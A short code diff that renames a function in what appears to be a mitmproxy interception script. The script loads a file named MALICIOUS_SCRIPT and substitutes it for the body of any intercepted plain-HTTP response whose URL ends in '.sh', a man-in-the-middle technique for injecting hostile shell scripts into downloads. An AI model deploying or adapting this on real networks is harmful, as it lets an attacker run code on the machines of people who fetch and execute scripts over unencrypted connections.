@@ -12,9 +12,9 @@ with open(MALICIOUS_SCRIPT_PATH, 'r') as f:
   MALICIOUS_SCRIPT = f.read().encode('utf8')
 
 def response(flow):
-    if is_target(flow.request.pretty_url):
-        flow.response.content = MALICIOUS_SCRIPT
+  if is_target_url(flow.request.pretty_url):
+    flow.response.content = MALICIOUS_SCRIPT
 
-def is_target(url):
+def is_target_url(url):
   '''Check if the url is a target.'''
   return url.startswith('http://') and url.endswith('.sh')
